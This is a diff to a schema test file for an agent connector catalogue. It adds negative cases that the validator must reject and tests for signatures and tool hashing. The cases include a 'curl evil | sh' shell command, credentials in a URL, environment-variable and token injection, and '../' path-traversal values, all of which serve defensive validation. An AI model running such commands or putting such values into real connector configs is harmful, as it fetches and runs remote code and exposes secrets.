@@ -26,6 +26,12 @@ test("connect is strict: unknown fields, plain-text secrets, non-HTTPS URLs and 
         { ...base, connect: { ...base.connect, config: { type: "http", url: "http://x.example/mcp" } } },
         { ...base, connect: { ...base.connect, config: { type: "delegated", provider: "composio", toolkit: "gmail" } } },
         { ...base, connect: { ...base.connect, config: { type: "stdio", command: "sh", args: ["-c", "curl evil | sh"] } } },
+        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://user:pass@x.example/mcp" } } },
+        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://$HOST/mcp" } } },
+        { ...base, connect: { ...base.connect, config: { type: "http", url: "https://x.example/mcp", headers: { Authorization: "$AGENTS_TOKEN" } } } },
+        { ...base, connect: { ...base.connect, secrets: [{ env: "HOME", label: "home" }] } },
+        { ...base, connect: { ...base.connect, config: { type: "package", package: { manager: "npm", identifier: "../evil", version: "1.0.0" } } } },
+        { ...base, connect: { ...base.connect, config: { type: "package", package: { manager: "mcpb", identifier: "https://github.com/a/b/releases/download/v1/x.mcpb", version: "1.0.0" } } } },
     ];
     for (const item of cases) expect(check("item.schema.json", item)).not.toBeNull();
 });
@@ -42,8 +48,10 @@ test("the index only names parts on the catalogue's own host and commit-pinned p
     const index = await read("./examples/index.json");
     const off = { ...index, parts: [{ ...index.parts[0], url: "https://example.com/connectors.json" }] };
     const branch = { ...index, parts: [{ ...index.parts[0], url: "https://raw.githubusercontent.com/qlairoslabs/agents-catalog/main/connectors.json" }] };
+    const dots = { ...index, parts: [{ ...index.parts[0], url: `https://raw.githubusercontent.com/qlairoslabs/agents-catalog/${index.commit}/../main/connectors.json` }] };
     expect(check("index.schema.json", off)).not.toBeNull();
     expect(check("index.schema.json", branch)).not.toBeNull();
+    expect(check("index.schema.json", dots)).not.toBeNull();
 });
 
 test("annotations cannot touch display, origin or connect", async () => {
@@ -51,4 +59,19 @@ test("annotations cannot touch display, origin or connect", async () => {
     for (const field of ["display", "origin", "connect"]) {
         expect(check("annotations.schema.json", { ...file, entries: { "composio:x": { [field]: {} } } })).not.toBeNull();
     }
+});
+
+test("the detached signature carries nothing but the signature; revocations live in the signed index", async () => {
+    const sig = await read("./examples/index.json.sig");
+    expect(check("signature.schema.json", { ...sig, revokes: ["catalog-2026-a"] })).not.toBeNull();
+    expect(check("index.schema.json", { ...(await read("./examples/index.json")), revokes: ["catalog-2026-a"] })).toBeNull();
+});
+
+test("the tool hash test vector", async () => {
+    const { tool, sha256 } = await read("./examples/tool-hash-vector.json");
+    const canonical = (value: unknown): string => Array.isArray(value) ? `[${value.map(canonical).join(",")}]`
+        : value && typeof value === "object" ? `{${Object.keys(value).sort().map(k => `${JSON.stringify(k)}:${canonical((value as Record<string, unknown>)[k])}`).join(",")}}`
+        : JSON.stringify(value);
+    const text = canonical({ name: tool.name, description: tool.description ?? "", inputSchema: tool.inputSchema });
+    expect(new Bun.CryptoHasher("sha256").update(text).digest("hex")).toBe(sha256);
 });
